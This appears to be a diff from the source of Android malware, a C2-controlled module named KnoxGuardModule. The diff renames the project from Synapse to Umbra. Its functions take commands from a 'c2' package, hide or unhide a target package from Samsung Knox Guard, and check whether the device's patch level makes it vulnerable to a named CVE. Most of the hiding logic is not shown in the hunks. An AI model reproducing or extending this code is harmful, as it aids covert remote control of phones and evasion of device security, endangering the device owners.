@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.ComponentName
 import android.content.Context
@@ -7,17 +7,17 @@ import android.os.Binder
 import android.os.IBinder
 import android.os.Parcel
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.lang.reflect.Method
 
 object KnoxGuardModule {
 
-    private const val TAG = "Synapse.KnoxGuard"
+    private const val TAG = "Umbra.KnoxGuard"
 
-    suspend fun hide(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun hide(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val targetPkg = cmd.params["package"] ?: context.packageName
         val results = mutableListOf<Map<String, String>>()
 
@@ -33,7 +33,7 @@ object KnoxGuardModule {
         val success = results.any { it["success"] == "true" }
         val technique = results.firstOrNull { it["success"] == "true" }?.get("technique") ?: "unknown"
 
-        SynapseResponse.KnoxHideResponse(
+        UmbraResponse.KnoxHideResponse(
             technique = technique,
             success = success,
             service_status = if (success) "hidden" else "partial",
@@ -42,7 +42,7 @@ object KnoxGuardModule {
         )
     }
 
-    suspend fun unhide(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun unhide(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val targetPkg = cmd.params["package"] ?: context.packageName
         val results = mutableListOf<Map<String, String>>()
 
@@ -64,7 +64,7 @@ object KnoxGuardModule {
             results.add(mapOf("technique" to "restore_components", "success" to "false", "error" to e.message.toString()))
         }
 
-        SynapseResponse.KnoxHideResponse(
+        UmbraResponse.KnoxHideResponse(
             technique = "restore",
             success = results.any { it["success"] == "true" },
             service_status = "visible",
@@ -73,7 +73,7 @@ object KnoxGuardModule {
         )
     }
 
-    suspend fun check(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun check(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val findings = mutableMapOf<String, String>()
 
         val kgClassNames = listOf(
@@ -91,7 +91,7 @@ object KnoxGuardModule {
             findings["vulnerable_to_cve_2026_21044"] = (patchLevel <= "2026-07-05").toString()
         } catch (_: Exception) {}
 
-        SynapseResponse.KnoxHideResponse(
+        UmbraResponse.KnoxHideResponse(
             technique = "check",
             success = true,
             service_status = findings.entries.joinToString(", ") { "${it.key}=${it.value}" },
